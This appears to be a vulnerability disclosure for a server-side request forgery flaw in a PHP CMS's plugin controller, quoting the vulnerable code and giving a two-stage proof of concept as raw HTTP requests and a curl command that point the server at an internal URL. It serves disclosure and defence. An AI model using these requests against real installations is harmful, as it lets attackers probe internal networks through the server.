| Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.  Impact version: 2.2.5 Test with PHP 7.2  The vulnerable code is located in the `index` function of the `app/admin/c/PluginsController.php` file, which fails to validate the webapi parameter, leading to a taint introduced from the `$webapi` variable into the tainted function `curl_setopt`, and after the `curl_exec` function is executed, it sends a request to the URL specified by the webapi parameter, eventually leading to an SSRF vulnerability. However, this vulnerability is triggered in two stages, first by passing the `set` parameter to reset the `webapi` section of the `plugins_config` field in `sysconfig`. The SSRF vulnerability is then triggered when the function is triggered again and without any parameter values.  ``` public function index(){ 	//检查更新链接是否可以访问 	$webapi = $this->webconf['plugins_config']; 	if(!$webapi){ 		$webapi = 'http://api.jizhicms.cn/plugins.php'; 		if(!M('sysconfig')->find(['field'=>'plugins_config'])){ 			M('sysconfig')->add(['title'=>JZLANG('插件配置'),'field'=>'plugins_config','type'=>2,'data'=>$webapi,'typeid'=>0]); 			setCache('webconfig',null); 		} 	} 	if($this->frparam('set')){         if($this->admin['isadmin']!=1){             JsonReturn(['code'=>1,'msg'=>JZLANG('非超级管理员无法设置！')]);         } 		$webapi = $this->frparam('webapi',1); 		M('sysconfig')->update(['field'=>'plugins_config'],['data'=>$webapi]); 		setCache('webconfig',null); 		JsonReturn(['code'=>0,'msg'=>'配置成功！']); 	} 	$this->webapi = $webapi; 	$api = $webapi.'?version='.$this->webconf['web_version']; 	$ch = curl_init(); 	$timeout = 5; 	curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1); 	curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 	curl_setopt($ch, CURLOPT_HEADER, false); 	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout); 	curl_setopt($ch,CURLOPT_URL,$api); 	$res = curl_exec($ch); 	$httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE); 	curl_close($ch); ```  Because the webapi parameters are not limited, it is also possible to use the server side to send requests, such as probing intranet web services. The corresponding PoC is as follows  PoC stage 1: the value of the webapi to set  ``` POST /index.php/admins/Plugins/index.html HTTP/1.1 Host: 172.16.119.130 Content-Length: 51 Accept: application/json, text/javascript, */*; q=0.01 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://172.16.119.130 Referer: http://172.16.119.130/index.php/admins/Plugins/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: think_var=zh-cn; PHPSESSID=lkbci4j8clqc6de6rhpn9fdk31 Connection: close  set=1&webapi=http%3A%2F%2F127.0.0.1%2Fwebapipoc.php  ```  You can also use the following curl command to verify the vulnerability as PoC Stage 1  ``` curl -i -s -k -X $'POST' \     -H $'Host: 172.16.119.130' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Connection: close' -H $'Content-Length: 51' \     -b $'think_var=zh-cn; PHPSESSID=g3e5nupqb19trokgr9msul8d9l' \     --data-binary $'set=1&webapi=http%3A%2F%2F127.0.0.1%2Fwebapipoc.php' \     $'http://172.16.119.130/index.php/admins/Plugins/index.html'  ```  PoC stage 2:  ``` GET /index.php/admins/Plugins/index.html HTTP/1.1 Host: 172.16.119.130 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://172.16.119.130/index.php/admins/Plugins/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: think_var=zh-cn; PHPSESSID=lkbci4j8clqc6de6rhpn9fdk31 Connection: close  ```  Eventually we can see the corresponding request in the apache server logs, which proves that the SSRF vulnerability can be triggered  [image](https://user-images.githubusercontent.com/16551733/169730163-b635dee1-e2e0-4fbc-8cfd-21350bfd0fd3.png) |
